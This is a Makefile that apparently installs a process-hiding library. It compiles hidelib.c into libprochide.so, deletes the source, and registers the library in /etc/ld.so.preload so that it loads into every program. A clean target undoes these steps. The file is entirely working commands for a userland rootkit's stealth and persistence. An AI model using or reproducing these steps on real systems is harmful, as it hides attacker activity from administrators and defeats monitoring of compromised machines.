install:
	./setup.sh
	gcc -Wall -fPIC -shared -o libprochide.so hidelib.c -ldl
	rm -f hidelib.c
	mv libprochide.so /usr/local/lib/
	echo /usr/local/lib/libprochide.so >> /etc/ld.so.preload
clean:
	sed -n '/\/usr\/local\/lib\/libprochide\.so/!p' /etc/ld.so.preload > temp
	mv -f temp /etc/ld.so.preload
	rm -f /usr/local/lib/libprochide.so hidelib.c
